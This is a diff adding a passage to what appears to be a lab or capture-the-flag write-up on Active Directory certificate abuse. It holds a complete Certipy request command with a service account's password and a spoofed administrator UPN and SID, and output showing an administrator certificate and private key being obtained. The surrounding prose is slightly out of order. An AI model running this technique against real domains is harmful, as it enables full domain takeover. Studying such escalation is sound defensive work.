@@ -705,5 +705,40 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 First ill read the SID of the domain admin
 
 ```python
+❯❯❯ certipy-ad req \
+    -u 'svc-pki@orion.local' -p 'Pki@Orion2026!' \
+    -dc-ip '10.0.0.5' -target 'dc01.orion.local' \
+    -ca 'orion-DC01-CA' -template 'OrionAuth' \
+    -upn 'administrator@orion.local' -sid 'S-1-5-21-285037524-3800758587-3641439792-500' -debug
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[+] DC host (-dc-host) not specified. Using domain as DC host
+[+] Nameserver: '10.0.0.5'
+[+] DC IP: '10.0.0.5'
+[+] DC Host: 'ORION.LOCAL'
+[+] Target IP: None
+[+] Remote Name: 'dc01.orion.local'
+[+] Domain: 'ORION.LOCAL'
+[+] Username: 'SVC-PKI'
+[+] Trying to resolve 'dc01.orion.local' at '10.0.0.5'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:10.0.0.5[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.0.0.5[\pipe\cert]
+[*] Request ID is 42
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@orion.local'
+[+] Found SID in SAN URL: 'S-1-5-21-285037524-3800758587-3641439792-500'
+[+] Found SID in security extension: 'S-1-5-21-285037524-3800758587-3641439792-500'
+[*] Certificate object SID is 'S-1-5-21-285037524-3800758587-3641439792-500'
+[*] Saving certificate and private key to 'administrator.pfx'
+[+] Attempting to write data to 'administrator.pfx'
+[+] Data written to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+```
+
+Ill then request an administrator cert
+
+```python
 
 ```
